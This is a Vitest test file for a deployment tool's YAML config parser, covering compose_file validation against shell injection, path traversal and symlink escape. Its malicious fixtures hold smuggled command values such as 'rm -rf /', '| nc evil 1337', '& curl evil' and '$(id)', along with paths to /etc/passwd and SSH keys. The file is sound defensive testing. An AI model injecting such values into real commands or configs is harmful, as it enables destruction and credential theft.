import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, mkdir, writeFile, rm, symlink } from "node:fs/promises";
import { tmpdir } from "node:os";
import { resolve } from "node:path";
import {
  parseRelayConfig,
  loadRelayConfig,
  assertComposeFileContained,
  RelayConfigError,
} from "./relay.js";

describe("parseRelayConfig", () => {
  it("parses minimal valid config", () => {
    const config = parseRelayConfig(`
name: my-app
health: /api/health
`);
    expect(config.name).toBe("my-app");
    expect(config.health).toBe("/api/health");
    expect(config.compose_file).toBe("docker-compose.yml");
    expect(config.command).toBeUndefined();
    expect(config.pre_update).toEqual([]);
    expect(config.post_update).toEqual([]);
    expect(config.rollback).toBe(true);
  });

  it("parses full config with all fields", () => {
    const config = parseRelayConfig(`
name: production-api
health: /health
compose_file: docker-compose.prod.yml
command: make deploy
pre_update:
  - make db-generate
  - npm run build
post_update:
  - docker compose exec backend npx prisma migrate deploy
rollback: false
`);
    expect(config.name).toBe("production-api");
    expect(config.health).toBe("/health");
    expect(config.compose_file).toBe("docker-compose.prod.yml");
    expect(config.command).toBe("make deploy");
    expect(config.pre_update).toEqual(["make db-generate", "npm run build"]);
    expect(config.post_update).toEqual([
      "docker compose exec backend npx prisma migrate deploy",
    ]);
    expect(config.rollback).toBe(false);
  });

  it("applies default values", () => {
    const config = parseRelayConfig(`
name: app
health: /up
`);
    expect(config.compose_file).toBe("docker-compose.yml");
    expect(config.rollback).toBe(true);
    expect(config.pre_update).toEqual([]);
    expect(config.post_update).toEqual([]);
  });

  it("rejects missing name", () => {
    expect(() =>
      parseRelayConfig(`
health: /api/health
`),
    ).toThrow(RelayConfigError);
  });

  it("rejects missing health", () => {
    expect(() =>
      parseRelayConfig(`
name: my-app
`),
    ).toThrow(RelayConfigError);
  });

  it("rejects empty name", () => {
    expect(() =>
      parseRelayConfig(`
name: ""
health: /health
`),
    ).toThrow(RelayConfigError);
  });

  it("rejects non-object YAML", () => {
    expect(() => parseRelayConfig("just a string")).toThrow(RelayConfigError);
  });

  it("rejects empty YAML", () => {
    expect(() => parseRelayConfig("")).toThrow(RelayConfigError);
  });

  it("provides clear error messages", () => {
    try {
      parseRelayConfig(`
health: /health
`);
      expect.unreachable("should have thrown");
    } catch (err) {
      expect(err).toBeInstanceOf(RelayConfigError);
      expect((err as RelayConfigError).message).toContain("name");
    }
  });

  it("supports custom command mode", () => {
    const config = parseRelayConfig(`
name: custom-deploy
health: /health
command: ./deploy.sh --production
`);
    expect(config.command).toBe("./deploy.sh --production");
  });

  describe("step_timeout_seconds", () => {
    it("is undefined when absent", () => {
      const config = parseRelayConfig(`
name: app
health: /health
`);
      expect(config.step_timeout_seconds).toBeUndefined();
    });

    it("accepts a valid integer value", () => {
      const config = parseRelayConfig(`
name: app
health: /health
step_timeout_seconds: 600
`);
      expect(config.step_timeout_seconds).toBe(600);
    });

    it("rejects 0", () => {
      expect(() =>
        parseRelayConfig(`
name: app
health: /health
step_timeout_seconds: 0
`),
      ).toThrow(/step_timeout_seconds/);
    });

    it("rejects a negative value", () => {
      expect(() =>
        parseRelayConfig(`
name: app
health: /health
step_timeout_seconds: -5
`),
      ).toThrow(/step_timeout_seconds/);
    });

    it("rejects a float value", () => {
      expect(() =>
        parseRelayConfig(`
name: app
health: /health
step_timeout_seconds: 1.5
`),
      ).toThrow(/step_timeout_seconds/);
    });

    it("rejects a string value", () => {
      expect(() =>
        parseRelayConfig(`
name: app
health: /health
step_timeout_seconds: "600"
`),
      ).toThrow(/step_timeout_seconds/);
    });
  });

  describe("compose_file shell-injection hardening", () => {
    const validValues = [
      "docker-compose.yml",
      "docker-compose.prod.yml",
      "deploy/compose.yml",
      "compose.yaml",
      "infra/docker/compose.prod.yml",
      "a_b-c.0.1.yml",
    ];

    for (const value of validValues) {
      it(`accepts safe value: ${value}`, () => {
        const config = parseRelayConfig(`
name: app
health: /health
compose_file: ${value}
`);
        expect(config.compose_file).toBe(value);
      });
    }

    // Each entry exercises a distinct shell-injection or path-traversal
    // vector that the hardening must reject before the value reaches the
    // shell layer.
    const malicious: [string, string][] = [
      ["single quote", "docker-compose.yml'; rm -rf /#"],
      ["double quote", 'docker-compose.yml"; echo pwned'],
      ["semicolon", "docker-compose.yml; touch /tmp/x"],
      ["pipe", "docker-compose.yml | nc evil 1337"],
      ["backtick command sub", "docker-compose.yml`whoami`"],
      ["dollar command sub", "docker-compose.yml$(id)"],
      ["space", "docker-compose.yml extra"],
      ["newline", "docker-compose.yml\nrm -rf /"],
      ["null byte", "docker-compose.yml\u0000.evil"],
      // `..` segments moved to loadRelayConfig's FS-aware containment
      // check — see the `assertComposeFileContained` describe block.
      // parseRelayConfig now accepts them at the string level; tests
      // below confirm that tolerance explicitly.
      ["ampersand", "docker-compose.yml & curl evil"],
      ["redirect", "docker-compose.yml > /tmp/x"],
      ["glob", "docker-compose.y*"],
      ["tilde", "~/.ssh/id_rsa"],
      ["absolute path", "/etc/passwd"],
      ["absolute compose path", "/var/lib/docker/compose.yml"],
      ["backslash", "deploy\\compose.yml"],
      ["leading whitespace", " docker-compose.yml"],
      ["trailing whitespace", "docker-compose.yml "],
      ["control char SOH", "docker-compose.yml\u0001evil"],
      ["empty string", ""],
    ];

    for (const [label, value] of malicious) {
      it(`rejects ${label}: ${JSON.stringify(value)}`, () => {
        // YAML-quoted so newlines / nulls / specials survive the load.
        const yaml = `name: app\nhealth: /health\ncompose_file: ${JSON.stringify(value)}\n`;
        expect(() => parseRelayConfig(yaml)).toThrow(RelayConfigError);
      });
    }

    it("error message points at compose_file", () => {
      try {
        parseRelayConfig(`
name: app
health: /health
compose_file: "evil; rm -rf /"
`);
        expect.unreachable("should have thrown");
      } catch (err) {
        expect(err).toBeInstanceOf(RelayConfigError);
        expect((err as RelayConfigError).message).toContain("compose_file");
      }
    });

    // These `..`-bearing shapes pass parse-time validation now (the
    // lexical ban moved to loadRelayConfig) but must still be rejected
    // once they hit the filesystem layer. Assertion lives below in the
    // `assertComposeFileContained` + `loadRelayConfig` describes; here
    // we just confirm parseRelayConfig is now tolerant of the SYNTAX.
    for (const value of [
      "../other-app/docker-compose.yml",
      "deploy/../compose.yml",
      "../../etc/passwd",
    ]) {
      it(`accepts \`..\` syntax at parse time (containment enforced at load time): ${value}`, () => {
        const yaml = `name: app\nhealth: /health\ncompose_file: ${JSON.stringify(value)}\n`;
        expect(() => parseRelayConfig(yaml)).not.toThrow();
      });
    }
  });
});

describe("assertComposeFileContained", () => {
  // Simulate the production layout: APPS_DIR is a parent, appDir is a
  // child of that parent. Use POSIX-shaped paths — the runtime target
  // is always Linux; cross-platform Windows tests aren't relevant.
  const APPS_DIR = "/apps";
  const appDir = "/apps/my-app";

  // These cases use abstract /apps paths that do not exist on disk, so the
  // realpath (symlink) pass short-circuits on ENOENT and only the lexical
  // check runs. The on-disk symlink behaviour is covered by the
  // "symlink containment" describe below.
  it("accepts a compose file inside the app directory", async () => {
    await expect(
      assertComposeFileContained(appDir, "docker-compose.yml"),
    ).resolves.toBeUndefined();
  });

  it("accepts a compose file in a nested directory of the app", async () => {
    await expect(
      assertComposeFileContained(appDir, "deploy/compose.yml"),
    ).resolves.toBeUndefined();
  });

  it("accepts a compose file in a sibling app directory", async () => {
    // The motivating case — agent-planforge at
    // /apps/agent-planforge/.relay.yml points at project-forge's
    // compose at /apps/project-forge/docker-compose.yml.
    await expect(
      assertComposeFileContained(appDir, "../other-app/docker-compose.yml"),
    ).resolves.toBeUndefined();
  });

  it("rejects a compose file that escapes the apps root", async () => {
    await expect(
      assertComposeFileContained(appDir, "../../etc/passwd"),
    ).rejects.toThrow(/resolves outside the apps directory/);
  });

  it("rejects a compose file that escapes via an embedded `..` segment", async () => {
    // `/apps/my-app/deploy/../../../etc/passwd` → `/etc/passwd`.
    await expect(
      assertComposeFileContained(appDir, "deploy/../../../etc/passwd"),
    ).rejects.toThrow(/resolves outside the apps directory/);
  });

  it("rejects a sibling-prefix false-positive (apps vs appsteak)", async () => {
    // Without the trailing `sep` in the startsWith check, a sibling
    // directory sharing APPS_DIR's name prefix (e.g. /appsteak/...) would
    // pass containment — this test pins the tightened check.
    await expect(
      assertComposeFileContained(
        "/appsteak/my-app",
        "../../apps/my-app/compose.yml",
      ),
    ).rejects.toThrow(/resolves outside the apps directory/);
  });

  it("error message names both the resolved path and the apps directory", async () => {
    try {
      await assertComposeFileContained(appDir, "../../etc/passwd");
      expect.unreachable();
    } catch (err) {
      expect(err).toBeInstanceOf(RelayConfigError);
      const msg = (err as RelayConfigError).message;
      expect(msg).toContain("/etc/passwd");
      expect(msg).toContain(APPS_DIR);
    }
  });
});

describe("assertComposeFileContained — symlink containment", () => {
  let tmpRoot: string;

  beforeEach(async () => {
    tmpRoot = await mkdtemp(resolve(tmpdir(), "agent-relay-compose-symlink-"));
  });

  afterEach(async () => {
    await rm(tmpRoot, { recursive: true, force: true });
  });

  it("rejects a compose_file that escapes APPS_DIR through a symlink", async () => {
    // Layout: <tmpRoot>/apps/my-app with a symlink my-app/link -> <tmpRoot>/escaped
    // (escaped is OUTSIDE the apps root). `link/docker-compose.yml` is lexically
    // contained (link looks like a subdir) but realpath resolves outside APPS_DIR.
    const appDir = resolve(tmpRoot, "apps", "my-app");
    const escaped = resolve(tmpRoot, "escaped");
    await mkdir(appDir, { recursive: true });
    await mkdir(escaped, { recursive: true });
    await writeFile(resolve(escaped, "docker-compose.yml"), "services: {}\n");
    await symlink(escaped, resolve(appDir, "link"));

    await expect(
      assertComposeFileContained(appDir, "link/docker-compose.yml"),
    ).rejects.toThrow(/symlink/);
  });

  it("accepts a real (non-symlinked) sibling app on disk", async () => {
    const appDir = resolve(tmpRoot, "apps", "my-app");
    const sibling = resolve(tmpRoot, "apps", "other-app");
    await mkdir(appDir, { recursive: true });
    await mkdir(sibling, { recursive: true });
    await writeFile(resolve(sibling, "docker-compose.yml"), "services: {}\n");

    await expect(
      assertComposeFileContained(appDir, "../other-app/docker-compose.yml"),
    ).resolves.toBeUndefined();
  });

  it("tolerates a not-yet-present compose file (ENOENT) without rejecting", async () => {
    const appDir = resolve(tmpRoot, "apps", "my-app");
    await mkdir(appDir, { recursive: true });

    await expect(
      assertComposeFileContained(appDir, "docker-compose.yml"),
    ).resolves.toBeUndefined();
  });
});

describe("loadRelayConfig — filesystem containment", () => {
  let tmpRoot: string;

  beforeEach(async () => {
    // Build a realistic APPS_DIR / appDir pair on disk so loadRelayConfig
    // can read a real file AND the containment check runs against real
    // resolved paths.
    tmpRoot = await mkdtemp(resolve(tmpdir(), "agent-relay-containment-"));
    await mkdir(resolve(tmpRoot, "sibling-app"), { recursive: true });
    await writeFile(
      resolve(tmpRoot, "sibling-app", "docker-compose.yml"),
      "services: {}\n",
    );
    await mkdir(resolve(tmpRoot, "my-app"), { recursive: true });
  });

  afterEach(async () => {
    await rm(tmpRoot, { recursive: true, force: true });
  });

  it("loads a config whose compose_file points at a sibling app", async () => {
    const appDir = resolve(tmpRoot, "my-app");
    await writeFile(
      resolve(appDir, ".relay.yml"),
      [
        "name: my-app",
        "health: /healthz",
        "compose_file: ../sibling-app/docker-compose.yml",
        "command: echo deploy",
      ].join("\n"),
    );
    const config = await loadRelayConfig(appDir);
    expect(config.compose_file).toBe("../sibling-app/docker-compose.yml");
  });

  it("rejects a config whose compose_file escapes the apps root", async () => {
    const appDir = resolve(tmpRoot, "my-app");
    await writeFile(
      resolve(appDir, ".relay.yml"),
      [
        "name: my-app",
        "health: /healthz",
        "compose_file: ../../outside/docker-compose.yml",
      ].join("\n"),
    );
    await expect(loadRelayConfig(appDir)).rejects.toThrow(
      /resolves outside the apps directory/,
    );
  });
});
